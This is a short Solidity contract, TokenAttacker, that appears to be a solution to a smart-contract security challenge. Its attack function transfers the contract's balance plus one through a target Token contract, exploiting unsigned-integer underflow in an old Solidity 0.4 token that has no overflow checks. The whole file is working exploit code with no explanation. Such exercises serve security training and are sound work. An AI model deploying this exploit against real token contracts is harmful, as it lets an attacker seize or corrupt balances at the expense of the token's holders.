pragma solidity ^0.4.18;

import "./token.sol";

 contract TokenAttacker {
  Token target;

  function TokenAttacker(address _token) public {
    target = Token(_token);
  }

  function attack(address to) public {
    uint256 balance = target.balanceOf(address(this));
    uint256 value = balance + 1;
    target.transfer(to, value);
  }

 }
